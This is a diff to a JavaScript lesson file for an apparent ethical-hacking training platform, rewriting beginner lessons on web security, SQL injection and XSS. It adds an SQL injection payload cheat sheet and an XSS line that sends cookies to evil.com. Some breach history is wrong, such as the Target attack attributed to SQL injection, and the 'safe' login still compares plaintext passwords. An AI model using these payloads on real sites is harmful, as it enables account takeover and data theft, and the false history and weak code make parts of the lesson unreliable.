@@ -412,47 +412,100 @@ app.post('/upload', async (req, res) => {
     'Introduction to Web Security': [
       {
         type: 'theory',
-        title: 'Understanding Web Security Fundamentals',
-        content: 'Web security is the practice of protecting websites and web applications from various cyber threats. The web operates on a client-server model where browsers (clients) communicate with web servers using HTTP/HTTPS protocols.\n\nKey concepts:\n• CIA Triad: Confidentiality, Integrity, Availability\n• Attack Surface: All points where an attacker can try to enter or extract data\n• Defense in Depth: Multiple layers of security controls\n• Principle of Least Privilege: Users should have minimum necessary access',
+        title: 'What is Web Security? (For Complete Beginners)',
+        content: 'Imagine your website is like a house. Web security is like having locks on doors, alarms, and security cameras to protect your house from bad people trying to break in.\n\n🏠 SIMPLE ANALOGY:\nWebsite = Your House\nVisitors = Website Users\nDoors/Windows = Input Fields (forms, search boxes)\nBad Guys = Hackers trying to break in\n\n📚 WHAT YOU WILL LEARN:\n• How websites work (like how your house works)\n• Where hackers try to break in (the weak spots)\n• How to protect websites (locks and alarms)\n• Ethical hacking (being a good security guard)\n\n🎯 WHY THIS MATTERS:\n• Websites handle your personal information\n• Credit cards, passwords, private messages\n• Hackers steal this information if not protected\n• YOU can learn to protect websites!\n\n🌐 HOW WEBSITES WORK (SUPER SIMPLE):\n1. You type a website address (like www.example.com)\n2. Your browser (Chrome, Firefox) sends a request\n3. The server (big computer) sends back the website\n4. You see the website on your screen\n\n💡 SECURITY BASICS:\nThink of security like layers of protection:\n• Front door lock (password)\n• Alarm system (firewall)\n• Security cameras (monitoring)\n• Guard dog (antivirus)\n\nAll these work together to keep you safe!',
+      },
+      {
+        type: 'theory',
+        title: 'Ethical Hacking: The Good Guys',
+        content: '🦸 WHAT IS ETHICAL HACKING?\n\nEthical hackers are like security guards who test if your locks work. They try to break in (WITH PERMISSION) to find weak spots before bad hackers do.\n\n✅ ETHICAL HACKER (Good Guy):\n• Gets PERMISSION before testing\n• Reports problems to the owner\n• Helps fix security issues\n• Follows the law\n• Gets paid legally\n\n❌ BAD HACKER (Criminal):\n• Breaks in without permission\n• Steals information\n• Damages systems\n• Breaks the law\n• Goes to jail\n\n⚖️ THE GOLDEN RULES:\n1. ALWAYS GET PERMISSION first\n2. NEVER attack systems you don\'t own\n3. REPORT vulnerabilities responsibly\n4. RESPECT privacy and laws\n5. USE skills to help, not harm\n\n🎓 BECOMING AN ETHICAL HACKER:\n• Learn how websites work\n• Understand common attacks\n• Practice in safe environments (like this platform)\n• Get certifications (CEH, OSCP)\n• Join bug bounty programs\n• Always follow ethical guidelines\n\n📜 LEGAL CONSIDERATIONS:\n• Computer Fraud and Abuse Act (USA)\n• Unauthorized access is ILLEGAL\n• Even good intentions = jail if no permission\n• Always use legal testing platforms\n• Document your work and permissions\n\n🎯 YOUR RESPONSIBILITY:\nWith great power comes great responsibility. You\'re learning powerful skills. Use them to protect people, not harm them.',
       },
       {
         type: 'example',
-        title: 'Common Web Vulnerabilities',
-        content: 'OWASP Top 10 vulnerabilities include:\n\n1. Injection Flaws (SQL, NoSQL, OS commands)\n2. Broken Authentication\n3. Sensitive Data Exposure\n4. XML External Entities (XXE)\n5. Broken Access Control\n6. Security Misconfiguration\n7. Cross-Site Scripting (XSS)\n8. Insecure Deserialization\n9. Using Components with Known Vulnerabilities\n10. Insufficient Logging & Monitoring',
+        title: 'Common Web Vulnerabilities (Explained Simply)',
+        content: '🔍 TOP 10 SECURITY PROBLEMS IN WEBSITES:\n\n1️⃣ INJECTION ATTACKS (Like sneaking bad instructions)\n   Simple: Imagine telling someone "close the door" but also sneaking in "and unlock the safe"\n   Real: Hacker adds secret commands to your input\n   Example: Instead of username, typing: admin\' OR \'1\'=\'1\n\n2️⃣ BROKEN AUTHENTICATION (Weak locks)\n   Simple: Using "password123" as your password\n   Real: Weak passwords, no login protection\n   Example: Trying admin/admin and it works!\n\n3️⃣ SENSITIVE DATA EXPOSURE (Leaving secrets visible)\n   Simple: Writing your bank PIN on your debit card\n   Real: Storing passwords without encryption\n   Example: Database shows passwords in plain text\n\n4️⃣ BROKEN ACCESS CONTROL (Wrong people getting in)\n   Simple: Student accessing teacher\'s computer\n   Real: Regular user accessing admin features\n   Example: Changing URL from user/1 to user/2 shows other user\'s data\n\n5️⃣ SECURITY MISCONFIGURATION (Leaving windows open)\n   Simple: Forgetting to lock your back door\n   Real: Default passwords, error messages showing too much\n   Example: Seeing detailed error with database password\n\n6️⃣ CROSS-SITE SCRIPTING (XSS) (Poisoning the water)\n   Simple: Someone adds poison to the town water supply\n   Real: Hacker injects bad code into website\n   Example: Comment section runs JavaScript alert(\'hacked\')\n\n7️⃣ INSECURE DESERIALIZATION (Trojan horse)\n   Simple: Enemy soldiers hiding in a gift box\n   Real: Malicious code hidden in data\n   Example: Uploaded file contains secret commands\n\n8️⃣ USING VULNERABLE COMPONENTS (Old, broken locks)\n   Simple: Using a 50-year-old rusty lock\n   Real: Outdated software with known problems\n   Example: WordPress plugin from 2015 with security holes\n\n9️⃣ INSUFFICIENT LOGGING (No security cameras)\n   Simple: No record of who entered the building\n   Real: Not tracking what happens on website\n   Example: Hacker breaks in and leaves no trace\n\n🔟 INJECTION IN DIFFERENT FORMS\n   Simple: Different ways to sneak in bad instructions\n   Real: SQL, OS commands, LDAP injection\n   Example: Typing commands that server executes\n\n💡 REMEMBER: All these are like different ways to break into a house. Each needs different protection!',
       },
       {
         type: 'code',
-        title: 'Secure vs Insecure Code Example',
-        content: `// INSECURE: Direct string concatenation
-const query = "SELECT * FROM users WHERE username = '" + userInput + "'";
+        title: 'Your First Security Lesson: Safe vs Unsafe Code',
+        content: `// ❌ BAD CODE (UNSAFE - Don't do this!)
+// This is like leaving your front door wide open
 
-// SECURE: Parameterized query
-const query = "SELECT * FROM users WHERE username = ?";
-db.query(query, [userInput]);`,
+// Taking user input and using it directly
+const username = getUserInput(); // User types: admin' OR '1'='1
+const query = "SELECT * FROM users WHERE name = '" + username + "'";
+// The query becomes: SELECT * FROM users WHERE name = 'admin' OR '1'='1'
+// This returns ALL users because 1=1 is always true!
+
+database.runQuery(query); // DANGER! Hacker can now see everyone's data
+
+
+// ✅ GOOD CODE (SAFE - Do this instead!)
+// This is like having a security guard check everyone
+
+// Method 1: Using safe parameters (BEST WAY)
+const username = getUserInput(); // Even if user types: admin' OR '1'='1
+const query = "SELECT * FROM users WHERE name = ?"; // The ? is a placeholder
+database.runQuery(query, [username]); // Username is treated as TEXT ONLY
+// No matter what user types, it's just treated as a name, not code!
+
+
+// Method 2: Cleaning the input (Good but not perfect)
+function cleanInput(userInput) {
+  // Remove all dangerous characters
+  return userInput
+    .replace(/['"]/g, '')  // Remove quotes
+    .replace(/[;<>]/g, '') // Remove special characters
+    .substring(0, 50);     // Limit length
+}
+
+const safeUsername = cleanInput(getUserInput());
+const query = "SELECT * FROM users WHERE name = '" + safeUsername + "'";
+
+
+// 🎯 WHY THE SAFE VERSION WORKS:
+// 1. The database treats user input as DATA, not CODE
+// 2. Special characters don't break the query
+// 3. Even if hacker types malicious code, it's ignored
+// 4. Your data stays safe!
+
+// 🏆 BEST PRACTICE:
+// Always use parameterized queries (Method 1)
+// NEVER put user input directly into queries`,
         codeLanguage: 'javascript',
       },
       {
         type: 'exercise',
-        title: 'Hands-On Exercise',
-        content: 'Task: Identify the security issues in this code:\n\n```\napp.get(\'/search\', (req, res) => {\n  const term = req.query.q;\n  res.send("<h1>Results for: " + term + "</h1>");\n});\n```\n\nProblems:\n1. No input validation on search term\n2. Direct concatenation enables XSS attacks\n3. No output encoding/escaping\n4. Missing Content-Security-Policy header',
+        title: 'Your First Hacking Challenge (Ethical & Legal)',
+        content: '🎮 BEGINNER SECURITY CHALLENGE:\n\nLet\'s practice finding problems in code. Remember: This is LEGAL because you have permission on this platform!\n\n📝 THE CHALLENGE:\nLook at this search feature code:\n\napp.get(\'/search\', (req, res) => {\n  const searchWord = req.query.q;\n  res.send("<h1>You searched for: " + searchWord + "</h1>");\n});\n\n🔍 FIND THE PROBLEMS:\n\nProblem 1: NO INPUT CHECKING\n• The code accepts ANYTHING you type\n• No limit on length (could type 1 million characters)\n• No checking for bad characters\n• It\'s like accepting any package without checking inside\n\nProblem 2: DIRECT CONCATENATION (Joining text directly)\n• The code adds your input directly to HTML\n• If you type: <script>alert(\'hacked\')</script>\n• The website will RUN that code!\n• It\'s like reading every note someone gives you out loud\n\nProblem 3: NO ENCODING/ESCAPING\n• Special characters should be converted to safe text\n• < should become &lt; (safe version)\n• > should become &gt; (safe version)\n• Without this, dangerous code can run\n\nProblem 4: MISSING SECURITY HEADERS\n• No Content-Security-Policy (CSP)\n• CSP is like a whitelist of allowed code\n• Without it, ANY code can run\n\n💡 HOW TO FIX IT:\n\nfunction searchSafely(req, res) {\n  let searchWord = req.query.q;\n  \n  // Step 1: Validate (check if input is okay)\n  if (!searchWord || searchWord.length > 100) {\n    return res.send("Invalid search");\n  }\n  \n  // Step 2: Escape dangerous characters\n  searchWord = escapeHtml(searchWord);\n  // Now <script> becomes &lt;script&gt; (safe text)\n  \n  // Step 3: Use safely\n  res.send("<h1>You searched for: " + searchWord + "</h1>");\n}\n\n🎯 TRY IT YOURSELF:\n1. Go to our XSS lab\n2. Try typing: <script>alert(\'test\')</script>\n3. See what happens!\n4. Then try the same on the fixed version\n5. Notice the difference?\n\n✅ YOU JUST LEARNED:\n• How to spot unsafe code\n• Why input validation matters\n• How to fix security problems\n• Ethical hacking basics!',
       },
       {
         type: 'tip',
-        title: 'Best Practices',
-        content: '✓ Always validate and sanitize user input\n✓ Use HTTPS for all communications\n✓ Implement proper authentication and session management\n✓ Keep software and dependencies updated\n✓ Use security headers (CSP, X-Frame-Options, etc.)\n✓ Log security events and monitor for anomalies\n✓ Apply principle of least privilege',
+        title: 'Golden Rules for Web Security (Remember These!)',
+        content: '🏆 THE SECURITY CHECKLIST (Print this out!):\n\n✅ RULE 1: NEVER TRUST USER INPUT\n   • Treat everything users type as potentially dangerous\n   • Like not eating food from strangers\n   • Always validate, clean, and check inputs\n   • Set maximum lengths and allowed characters\n\n✅ RULE 2: USE HTTPS EVERYWHERE\n   • HTTP = Sending postcards (anyone can read)\n   • HTTPS = Sending locked boxes (encrypted)\n   • Never send passwords over HTTP\n   • Look for the padlock icon in browser\n\n✅ RULE 3: STRONG AUTHENTICATION\n   • Passwords: At least 12 characters, mix of types\n   • Use password managers (LastPass, 1Password)\n   • Enable Two-Factor Authentication (2FA)\n   • Never use: password123, admin, qwerty\n\n✅ RULE 4: KEEP EVERYTHING UPDATED\n   • Old software = old locks that hackers know how to pick\n   • Update your framework, libraries, plugins\n   • Subscribe to security bulletins\n   • Set up automatic updates when possible\n\n✅ RULE 5: USE SECURITY HEADERS\n   • Content-Security-Policy: Controls what code can run\n   • X-Frame-Options: Prevents clickjacking\n   • X-XSS-Protection: Browser\'s XSS filter\n   • Think of these as extra locks on doors\n\n✅ RULE 6: LOG AND MONITOR\n   • Keep records of everything (who, what, when)\n   • Like security camera footage\n   • Check logs regularly for suspicious activity\n   • Set up alerts for unusual patterns\n\n✅ RULE 7: PRINCIPLE OF LEAST PRIVILEGE\n   • Give users ONLY what they need\n   • Regular user shouldn\'t access admin panel\n   • Database user shouldn\'t delete tables\n   • Like not giving house keys to everyone\n\n✅ RULE 8: ENCRYPT SENSITIVE DATA\n   • Passwords: Use bcrypt or Argon2\n   • Credit cards: Use tokenization\n   • Personal info: Encrypt at rest\n   • Like storing valuables in a safe\n\n✅ RULE 9: HAVE A BACKUP PLAN\n   • Regular backups of data\n   • Incident response plan\n   • Know what to do if hacked\n   • Like having insurance\n\n✅ RULE 10: ETHICAL HACKING MINDSET\n   • Always get permission first\n   • Document your findings\n   • Report responsibly\n   • Never harm or steal\n   • Use power for good\n\n📚 STUDY RESOURCES:\n• OWASP.org (free security guides)\n• HackerOne (bug bounty platform)\n• PortSwigger Academy (free web security)\n• This platform (hands-on practice)\n\n🎯 YOUR MISSION:\nBecome a security defender. Learn to think like a hacker, but act like a protector. The internet needs good people like you!',
       },
     ],
     'SQL Injection Basics': [
       {
         type: 'theory',
-        title: 'What is SQL Injection?',
-        content: 'SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application\'s database layer. It occurs when user input is improperly filtered or not parameterized.\n\nHow it works:\n1. Attacker finds an input field that interacts with database\n2. Injects malicious SQL code\n3. Database executes the malicious code\n4. Attacker gains unauthorized access to data\n\nTypes of SQL Injection:\n• In-band SQLi (Classic): Results shown directly\n• Blind SQLi: No direct results, use inference\n• Out-of-band SQLi: Uses different channels for results',
+        title: 'SQL Injection Explained Like You\'re Five',
+        content: '🍪 THE COOKIE JAR STORY:\n\nImagine you have a robot that guards a cookie jar. You ask: "Robot, give me MY cookies" and it gives you yours.\n\nBut what if you said: "Robot, give me MY cookies OR give me ALL cookies"?\n\nThe confused robot gives you EVERYTHING!\n\nThat\'s SQL Injection.\n\n🤖 WHAT IS SQL?\n\nSQL (Structured Query Language) is the language computers use to talk to databases.\n\nThink of it like this:\n• Database = Library with millions of books\n• SQL = The way you ask the librarian for books\n• Tables = Shelves in the library\n• Rows = Individual books\n• Columns = Book information (title, author, year)\n\nNormal SQL:\n"Please give me the book where title = \'Harry Potter\'"\n\nMalicious SQL:\n"Please give me the book where title = \'Harry Potter\' OR give me ALL books"\n\n🎯 HOW SQL INJECTION WORKS (STEP BY STEP):\n\nStep 1: Website asks for your username\n  Website: "What\'s your username?"\n  Normal user: "john"\n  \nStep 2: Website creates a query\n  Query: SELECT * FROM users WHERE username = \'john\'\n  Translation: "Show me the user named john"\n  \nStep 3: ATTACK - Hacker types special characters\n  Hacker types: admin\' --\n  Query becomes: SELECT * FROM users WHERE username = \'admin\' --\' AND password = \'...\'\n  The -- comments out the rest (password check disappears!)\n  Translation: "Show me admin user, ignore everything after this"\n  \nStep 4: Hacker gets in WITHOUT password!\n\n⚠️ TYPES OF SQL INJECTION:\n\n1️⃣ CLASSIC SQLi (You see results immediately)\n   • Type payload in search box\n   • Website shows you the data\n   • Like asking robot and it answers right away\n   \n2️⃣ BLIND SQLi (No direct results)\n   • Website doesn\'t show data\n   • But acts differently if you\'re right\n   • Like robot nodding yes/no\n   • Takes longer but still works\n   \n3️⃣ TIME-BASED BLIND (Watch the clock)\n   • Make database sleep for 5 seconds\n   • If response takes 5 seconds = you\'re right\n   • Like robot pausing when answer is yes\n\n🎓 ETHICAL HACKING NOTE:\nOnly practice SQL injection on:\n✅ This learning platform\n✅ Systems you own\n✅ Bug bounty programs with permission\n✅ Intentionally vulnerable apps (like DVWA)\n\n❌ NEVER on:\n• Real company websites\n• School/work systems\n• Any system without written permission',
+      },
+      {
+        type: 'theory',
+        title: 'Why SQL Injection is Dangerous (Real Stories)',
+        content: '💰 REAL HACKS THAT HAPPENED:\n\n🏦 HEARTLAND PAYMENT SYSTEMS (2008)\n• SQL injection attack\n• 130 MILLION credit cards stolen\n• Company paid $140 million in fines\n• All because of one SQL injection vulnerability\n\n🎮 SONY PLAYSTATION (2011)\n• SQL injection on website\n• 77 MILLION user accounts compromised\n• Usernames, passwords, addresses stolen\n• PlayStation Network down for 23 days\n• Cost: Over $170 million\n\n🛒 TARGET STORES (2013)\n• Attackers used SQL injection\n• 40 million credit card numbers stolen\n• 70 million customer records exposed\n• CEO resigned, company paid billions\n\n💡 WHAT HACKERS CAN DO WITH SQL INJECTION:\n\n1️⃣ STEAL USER ACCOUNTS\n   • Get everyone\'s username and password\n   • Sell them on dark web\n   • Use them to hack other accounts\n   \n2️⃣ STEAL CREDIT CARDS\n   • Access payment information\n   • Make fraudulent purchases\n   • Sell card numbers to criminals\n   \n3️⃣ DELETE EVERYTHING\n   • Run command: DROP TABLE users;\n   • All user data gone forever\n   • Company loses everything\n   \n4️⃣ PLANT BACKDOORS\n   • Create admin accounts\n   • Come back anytime\n   • Stay hidden for months\n   \n5️⃣ TAKE OVER SERVER\n   • Execute operating system commands\n   • Install malware\n   • Use server for illegal activities\n\n⚖️ LEGAL CONSEQUENCES:\n\n😈 FOR BAD HACKERS:\n• Federal prison (5-20 years)\n• Huge fines ($250,000+)\n• Banned from using computers\n• Criminal record forever\n• Cannot get good jobs\n\n😇 FOR ETHICAL HACKERS:\n• Get paid to find bugs\n• Bug bounties ($100-$10,000+)\n• Jobs at top companies\n• Help protect millions\n• Feel good about your work\n\n🎯 THE CHOICE IS YOURS:\nUse these skills to PROTECT, not ATTACK!',
       },
       {
         type: 'code',
-        title: 'Vulnerable Code Example',
-        content: `// VULNERABLE LOGIN FUNCTION
+        title: 'How Hackers Break Login Forms (Step by Step)',
+        content: `// ❌ VULNERABLE LOGIN (Don't write code like this!)
+// This code is DANGEROUS and easy to hack
+
 function login(username, password) {
+  // PROBLEM: User input goes DIRECTLY into SQL query
+  // It's like letting anyone write on the instruction card
+
   const query = \`
     SELECT * FROM users
     WHERE username = '\${username}'
@@ -463,16 +516,92 @@ function login(username, password) {
   return result.length > 0;
 }
 
-// Attack payload: username = "admin' --"
-// Resulting query:
-// SELECT * FROM users WHERE username = 'admin' --' AND password = ''
-// The -- comments out the password check!`,
+// 🎯 HOW THE ATTACK WORKS:
+
+// Normal User Types:
+username: "john"
+password: "mypassword123"
+
+// Query becomes:
+SELECT * FROM users WHERE username = 'john' AND password = 'mypassword123'
+// ✅ Normal - checks both username AND password
+
+
+// 🚨 HACKER ATTACK:
+
+// Hacker Types:
+username: "admin' --"
+password: "anything"
+
+// Query becomes:
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
+//                                           ^^^ THIS PART IS COMMENTED OUT!
+
+// Translation in English:
+// "Find user named admin, and ignore everything after the --"
+// Password check DISAPPEARS!
+// Hacker logs in without knowing password!
+
+
+// 🔴 ANOTHER ATTACK:
+
+// Hacker Types:
+username: "' OR '1'='1"
+password: "' OR '1'='1"
+
+// Query becomes:
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
+
+// Translation:
+// "Find users where username is empty OR 1=1 is true (always true!)"
+// Returns ALL users!
+// Hacker logs in as first user (usually admin)
+
+
+// ✅ SAFE VERSION (Always write code like this!)
+
+function loginSafely(username, password) {
+  // Method 1: PARAMETERIZED QUERY (BEST!)
+  // The ? marks are placeholders
+  // Database treats input as DATA, not CODE
+
+  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
+  const result = db.query(query, [username, password]);
+  // Even if hacker types admin' --, it's treated as literal text
+  // Database looks for user named exactly "admin' --" (which doesn't exist)
+
+  return result.length > 0;
+}
+
+// Why This is Safe:
+// 1. User input never becomes part of the SQL command
+// 2. Special characters like ' and -- are escaped automatically
+// 3. Database knows: "This is data, not instructions"
+// 4. Attack fails completely!
+
+
+// 💡 REAL-WORLD EXAMPLE:
+
+// Bad Website Code:
+app.post('/login', (req, res) => {
+  const { username, password } = req.body;
+  const query = "SELECT * FROM users WHERE user='" + username + "'";
+  // 🚨 HACKABLE!
+});
+
+// Good Website Code:
+app.post('/login', (req, res) => {
+  const { username, password } = req.body;
+  const query = "SELECT * FROM users WHERE user = ?";
+  db.query(query, [username]);
+  // ✅ SAFE!
+});`,
         codeLanguage: 'javascript',
       },
       {
         type: 'example',
-        title: 'Common SQL Injection Payloads',
-        content: 'Authentication bypass:\n• \' OR \'1\'=\'1\n• \' OR \'1\'=\'1\'--\n• admin\'--\n• admin\'#\n\nData extraction:\n• \' UNION SELECT username, password FROM users--\n• \' UNION SELECT table_name FROM information_schema.tables--\n\nBoolean-based blind:\n• \' AND 1=1--  (returns true)\n• \' AND 1=2--  (returns false)\n\nTime-based blind:\n• \'; WAITFOR DELAY \'00:00:05\'--\n• \'; SELECT SLEEP(5)--',
+        title: 'SQL Injection Cheat Sheet (Your Hacking Toolkit)',
+        content: '🎯 BEGINNER PAYLOADS (Start Here!):\n\n1️⃣ AUTHENTICATION BYPASS (Skip password check)\n\n   Username: admin\' --\n   Password: anything\n   \n   Explanation:\n   • The \' closes the username quote\n   • -- comments out password check\n   • You get in without password!\n   \n   Try also:\n   • admin\'#\n   • admin\'/*\n   • \' OR \'1\'=\'1\n   • \' OR 1=1--\n\n\n2️⃣ UNIVERSAL BYPASS (Works on username OR password)\n\n   Type in password field: \' OR \'1\'=\'1\n   \n   Explanation:\n   • \'1\'=\'1 is ALWAYS true\n   • OR means "this OR that"\n   • Since 1=1 is true, you get in!\n   \n   Try also:\n   • \' OR \'a\'=\'a\n   • \' OR \'x\'=\'x\n   • 1\' OR \'1\' = \'1\n\n\n3️⃣ EXTRACT ALL DATA (See everything)\n\n   Search box: \' OR 1=1--\n   \n   Explanation:\n   • Makes query return ALL records\n   • Like asking librarian for ALL books\n   • You see everyone\'s data!\n   \n   Try also:\n   • \' OR \'1\'=\'1\n   • \' OR 1=1#\n\n\n4️⃣ UNION ATTACK (Combine results)\n\n   \' UNION SELECT username, password FROM users--\n   \n   Explanation:\n   • UNION combines two queries\n   • First query: what you searched\n   • Second query: ALL usernames and passwords\n   • You see passwords!\n   \n   Try also:\n   • \' UNION SELECT NULL, username, password FROM users--\n   • \' UNION SELECT 1,2,3--\n\n\n5️⃣ FIND TABLE NAMES (Map the database)\n\n   \' UNION SELECT table_name FROM information_schema.tables--\n   \n   Explanation:\n   • information_schema = Map of database\n   • Shows all table names\n   • Like finding floor plan of building\n   \n   Try also:\n   • \' UNION SELECT column_name FROM information_schema.columns--\n\n\n🕐 ADVANCED: TIME-BASED BLIND SQLi\n\n   \' AND SLEEP(5)--\n   \' OR IF(1=1, SLEEP(5), 0)--\n   \n   Explanation:\n   • Makes database wait 5 seconds\n   • If page loads in 5 seconds = query worked\n   • Used when you can\'t see results\n\n\n🎓 ETHICAL HACKING REMINDER:\n\n✅ PRACTICE HERE:\n• This learning platform\n• Your own test sites\n• Bug bounty programs\n• DVWA, WebGoat, Hack The Box\n\n❌ NEVER USE ON:\n• Real company websites\n• School computers\n• Work systems\n• Without written permission\n\n📚 NEXT STEPS:\n1. Try each payload in our SQL Injection Lab\n2. Understand WHY each works\n3. Learn how to FIX these vulnerabilities\n4. Practice on legal platforms only\n5. Report bugs responsibly',
       },
       {
         type: 'code',
@@ -516,8 +645,13 @@ function sanitizeInput(input) {
     'Cross-Site Scripting (XSS)': [
       {
         type: 'theory',
-        title: 'Understanding XSS Attacks',
-        content: 'Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes these scripts, potentially stealing cookies, session tokens, or other sensitive information.\n\nThree main types:\n\n1. Reflected XSS:\n   - Malicious script comes from HTTP request\n   - Not stored in database\n   - Example: Search results page\n\n2. Stored XSS:\n   - Script stored in database\n   - Executed when data is retrieved\n   - Example: Comment sections, user profiles\n\n3. DOM-based XSS:\n   - Vulnerability in client-side JavaScript\n   - No server interaction needed',
+        title: 'XSS Explained with a Simple Story',
+        content: '📺 THE TV BROADCAST STORY:\n\nImagine a TV station that broadcasts whatever people send them:\n\n👨 Normal viewer sends: "Hello everyone!"\n📺 TV shows: "Hello everyone!"\n✅ Everything is fine\n\n😈 Bad person sends: "Hello! [SECRET MESSAGE: Steal all credit cards]"\n📺 TV shows: "Hello! [SECRET MESSAGE: Steal all credit cards]"\n❌ Everyone sees the malicious message!\n\nThat\'s XSS (Cross-Site Scripting)\n\n🌐 WHAT IS XSS?\n\nXSS = Cross-Site Scripting (called XSS not CSS to avoid confusion with styling)\n\nIt happens when:\n1. Website takes your input (comment, search, profile)\n2. Website shows that input to other users\n3. Website doesn\'t clean the input\n4. Bad code runs in other users\' browsers\n\n🎯 SIMPLE EXAMPLE:\n\nComment Section (Vulnerable):\nUser types: "Great article! <script>alert(\'Hacked!\')</script>"\nWebsite saves it to database\nWhen others view the page, JavaScript RUNS!\nAlert box pops up saying "Hacked!"\n\n💡 WHY IS THIS DANGEROUS?\n\nInstead of alert(\'Hacked\'), attacker can:\n• Steal your cookies (login sessions)\n• Redirect you to fake login page\n• Steal everything you type\n• Take over your account\n• Spread malware\n\n🎭 THREE TYPES OF XSS:\n\n1️⃣ REFLECTED XSS (Bounce attack)\n   • Code in URL, not saved\n   • Like throwing a ball at mirror\n   • Ball bounces back at you\n   \n   Example URL:\n   https://site.com/search?q=<script>alert(1)</script>\n   \n   How it works:\n   • Attacker sends victim this URL\n   • Victim clicks link\n   • Website reflects the script back\n   • Script runs in victim\'s browser\n   \n2️⃣ STORED XSS (Planted bomb)\n   • Code saved in database\n   • Like planting a trap\n   • Explodes when anyone triggers it\n   \n   Example:\n   • Attacker posts comment with script\n   • Database saves the malicious comment\n   • EVERYONE who views page gets attacked\n   • Most dangerous type!\n   \n3️⃣ DOM-BASED XSS (Client-side)\n   • JavaScript itself is vulnerable\n   • Doesn\'t involve server\n   • Happens only in browser\n   \n   Example:\n   JavaScript code:\n   let search = window.location.hash;\n   document.write(search);\n   // If URL is #<script>alert(1)</script>\n   // The script executes!\n\n🔍 REAL-WORLD ANALOGY:\n\nImagine a bulletin board where people post messages:\n\n✅ SAFE BULLETIN BOARD:\n• Checks every message before posting\n• Removes dangerous content\n• Only allows text, no special commands\n\n❌ UNSAFE BULLETIN BOARD:\n• Posts everything without checking\n• Someone posts: "Free pizza! [Also: burn the building]"\n• Everyone who reads it gets bad instructions\n\n🎓 ETHICAL HACKING:\n\nXSS testing is LEGAL on:\n✅ This learning platform\n✅ Your own websites\n✅ Bug bounty programs\n✅ With written permission\n\n❌ ILLEGAL on:\n• Social media sites\n• Company websites\n• School/university sites\n• ANY site without permission\n\n⚖️ CONSEQUENCES:\n• Prison time (1-10 years)\n• Heavy fines\n• Criminal record\n• Ruined career\n\nBe ethical. Always ask permission!',
+      },
+      {
+        type: 'theory',
+        title: 'Why XSS is Everywhere (And Very Dangerous)',
+        content: '🔥 REAL XSS ATTACKS THAT HAPPENED:\n\n🐦 TWITTER XSS WORM (2010)\n• User posted tweet with XSS payload\n• Anyone who viewed tweet got infected\n• Their account automatically retweeted it\n• Spread to thousands in minutes\n• Called the "StalkDaily worm"\n\n🎮 MYSPACE SAMY WORM (2005)\n• Attacker: Samy Kamkar (19 years old)\n• Created XSS worm in profile\n• Added him as friend to anyone viewing profile\n• Posted "Samy is my hero" on their profile\n• Infected 1 MILLION users in 20 hours\n• Took down entire MySpace\n• Samy got arrested (but became famous hacker)\n\n🎯 FACEBOOK XSS (Multiple times)\n• Attackers found XSS in messages\n• Sent messages that auto-shared\n• Stole access tokens\n• Took over accounts\n\n💡 WHAT ATTACKERS DO WITH XSS:\n\n1️⃣ COOKIE STEALING (Most common)\n   What: Steal your login session cookie\n   How: <script>fetch(\'https://evil.com/?c=\'+document.cookie)</script>\n   Result: Attacker logs in as you\n   \n2️⃣ KEYLOGGING (Record everything you type)\n   What: Capture all keyboard input\n   How: Add invisible keylogger script\n   Result: Passwords, credit cards, messages stolen\n   \n3️⃣ PHISHING (Fake login forms)\n   What: Show fake login popup\n   How: Inject HTML that looks like real login\n   Result: You type password into attacker\'s form\n   \n4️⃣ DEFACEMENT (Change how site looks)\n   What: Make site look hacked\n   How: Inject HTML/CSS\n   Result: Damage site\'s reputation\n   \n5️⃣ CRYPTOJACKING (Use your computer to mine crypto)\n   What: Run cryptocurrency miner\n   How: Inject mining script\n   Result: Your computer slows down, attacker makes money\n   \n6️⃣ WORMS (Spread automatically)\n   What: Self-replicating XSS\n   How: Script posts itself from infected accounts\n   Result: Spreads to millions\n\n📊 XSS STATISTICS:\n\n• #2 most common web vulnerability (OWASP Top 10)\n• Found in 50%+ of websites\n• Average bug bounty: $500-$5,000\n• Record bounty: $10,000+ for critical XSS\n• Facebook pays $5,000-$30,000 for XSS bugs\n\n🎓 BECOMING AN XSS EXPERT:\n\nWHAT TO LEARN:\n1. HTML basics (how web pages work)\n2. JavaScript (the language of browsers)\n3. Browser security model (same-origin policy)\n4. Encoding (URL, HTML, JavaScript encoding)\n5. WAF bypasses (how to get around filters)\n\nWHERE TO PRACTICE LEGALLY:\n• This platform (you\'re here!)\n• XSS Game by Google\n• PortSwigger Web Security Academy\n• HackerOne bug bounty programs\n• PentesterLab\n• Hack The Box\n\n💰 BUG BOUNTY CAREER:\n\nTop XSS hunters make:\n• $10,000-$100,000+ per year\n• Some make $1 million+ \n• Full-time job hunting bugs\n• Work from anywhere\n• Help make internet safer\n\n🚨 THE DARK SIDE (Don\'t do this!):\n\nBlack hat hackers who use XSS maliciously:\n• Get arrested eventually\n• Face federal charges\n• Get sued by companies\n• Pay massive fines\n• Go to prison\n• Lose everything\n\nIT\'S NOT WORTH IT! Stay ethical!',
       },
       {
         type: 'code',
